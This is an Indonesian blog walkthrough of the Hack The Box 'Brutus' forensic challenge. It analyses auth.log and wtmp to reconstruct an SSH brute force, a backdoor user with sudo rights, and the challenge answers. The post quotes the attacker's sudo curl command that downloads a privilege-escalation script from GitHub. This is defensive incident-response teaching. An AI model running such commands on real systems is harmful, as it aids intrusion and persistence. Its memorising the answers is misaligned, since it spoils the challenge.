---
title: "Ungkap SSH Brute Force Lewat Log Auth dan Wtmp Bareng Brutus HTB"
date: 2026-03-04 00:00:00 +0700
categories: [Blue Team, CTF, Forensik, Linux]
authors: [fachri]
tags: [Hack The Box, SSH Brute Force, Auth Log, Linux Forensic, Wtmp, Incident Response, MITRE ATT&CK]
toc: true
comments: false
description: "Walkthrough forensic Brutus HTB: analisis auth.log dan wtmp untuk melacak SSH brute force, persistence user, dan privilege escalation. Teknik Linux forensic lengkap."
media_subpath: /content/img/BrutusHTB
---

# SSH Brute Force Terungkap: Walkthrough Forensic Brutus dari Hack The Box

![Cover challenge Brutus HackTheBox](10.png)

Bayangin lo punya Confluence server yang kebuka SSH-nya ke publik. Suatu pagi lo cek auth.log dan nemu ribuan baris Failed Password. Jelas kena brute force. Tapi yang lebih serem: di antara semua percobaan itu, ada satu yang berhasil. Dan attacker udah bikin user baru, ngasih sudo, dan download script.

Ini skenario dari **Brutus** Sherlock di Hack The Box. Level Very Easy, tapi jangan remehin. Justru dari kasus simpel kayak gini lo bisa belajar gimana attacker bergerak setelah dapet akses. Auth.log bukan cuma buat deteksi brute force, tapi juga buat backtrack seluruh aktivitas attacker: dari login, persistence, sampe command execution.

## Deskripsi Soal

In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

### Soal 1: IP Attacker

Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

**Penjelasan:**

Cari IP yang paling banyak melakukan percobaan login gagal. Di auth.log, setiap percobaan SSH dicatat dengan format:

```
Failed password for [user] from [IP] port [port] ssh2
```

![auth.log menampilkan IP 65.2.161.68 melakukan SSH brute force](1.png)

**Jawaban:** `65.2.161.68`

### Soal 2: Username yang Berhasil Login

The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?

**Penjelasan:**

Cari baris `Accepted password`. Ini indikasi brute force berhasil. Dari semua percobaan yang ada, yang berhasil login cuma satu:

![Log Accepted password untuk user root dari IP attacker](2.png)

**Jawaban:** `root`

### Soal 3: Timestamp Login Manual (wtmp)

Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

**Penjelasan:**

Auth.log cuma nyatet percobaan autentikasi. Tapi kapan attacker beneran dapet akses terminal? Informasi ini ada di **wtmp**, file binary yang nyatet historical login.

Gunakan script Python yang dikasih di soal buat parse wtmp:

![Hasil parsing file wtmp menggunakan script Python](3.png)

Dari hasil parsing, attacker login manual dari IP `65.2.161.68` pada pukul **13:32:45** (waktu lokal WIB). Karena log disimpan di wtmp dalam format UTC, perlu dikonversi. WIB = UTC+7.

![Timestamp login attacker di wtmp dalam format WIB](4.png)

> Waktu Indonesia Barat (WIB) adalah UTC+7. Artinya WIB lebih cepat 7 jam dari UTC. Konversi: kurangi 7 jam dari WIB.

13:32:45 WIB - 7 jam = **06:32:45 UTC**

**Jawaban:** `2024-03-06 06:32:45`

### Soal 4: Session Number

SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

**Penjelasan:**

Cari `session opened` buat user root di auth.log. Setiap login SSH dikasih session ID unik.

![auth.log menunjukkan session 37 terbuka untuk user root](5.png)

Session yang dipake: **37**.

**Jawaban:** `37`

### Soal 5: User Persistence

The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

**Penjelasan:**

Attacker gak cuma login terus keluar. Dia bikin backdoor dengan cara nambah user baru dan ngasih akses sudo. Cek auth.log buat aktivitas `useradd`:

![Log pembuatan user cyberjunkie dan pemberian akses sudo](6.png)

User baru: **cyberjunkie**. Udah dikasih akses sudo juga lewat `usermod -aG sudo`.

**Jawaban:** `cyberjunkie`

### Soal 6: MITRE ATT&CK ID

What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

**Penjelasan:**

Pembuatan akun lokal buat persistence ini masuk ke framework **MITRE ATT&CK**. Teknik spesifiknya: [T1136.001](https://attack.mitre.org/techniques/T1136/001/): Create Account: Local Account.

![MITRE ATTACK halaman T1136.001 Local Account](11.png)

Ini masuk kategori persistence karena attacker bikin akun baru buat maintain akses.

**Jawaban:** `T1136.001`

### Soal 7: Waktu Session Berakhir

What time did the attacker's first SSH session end according to auth.log?

**Penjelasan:**

Cari baris `session closed` buat session 37. Ini nandain kapan attacker logout atau koneksi SSH terputus.

![auth.log mencatat session 37 ditutup](8.png)

**Jawaban:** `2024-03-06 06:37:24`

### Soal 8: Command Execution via Sudo

The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

**Penjelasan:**

Setelah login pake user cyberjunkie, attacker ngejalanin command via sudo buat download script. Ini tercatat di auth.log.

![Log eksekusi curl untuk download linper.sh via sudo](9.png)

Command yang dijalankan:

```bash
sudo /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

`linper.sh` adalah script Linux privilege escalation checker. Attacker pake ini buat nyari celah naikin akses lebih tinggi.

**Jawaban:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

## Kesimpulan

Dari satu file auth.log, kita bisa reconstruct hampir seluruh timeline serangan. Mulai dari IP attacker, username yang kena, session yang dipake, user backdoor yang dibuat, sampe command yang dijalankan. Ini penting banget buat incident response.

Yang menarik: attacker pake teknik brute force klasik, tapi setelah dapet akses dia gak langsung ngaco. Dia bikin user baru, sudo-in, trus jalanin script enumerasi. Ini pola yang umum di serangan real: attacker masuk, ngecek environment, trus nentuin langkah berikutnya.

### Takeaway Teknis

1. **Auth.log adalah sumber utama** buat deteksi brute force SSH. Cari pola `Failed password` dari IP yang sama dalam jumlah banyak.
2. **Wtmp** nyimpen historical login yang lebih akurat dari auth.log. Berguna buat korelasi timestamp login.
3. **Session ID di auth.log** ngebantu lo track aktivitas attacker dari login sampe logout dalam satu sesi.
4. **User persistence** bisa dideteksi lewat log `useradd` dan `usermod`. Attacker biasanya bikin akun baru dengan nama yang gak mencolok.
5. **Pemetaan MITRE ATT&CK** membantu lo klasifikasi serangan ke dalam framework industri. T1136.001 untuk local account creation.
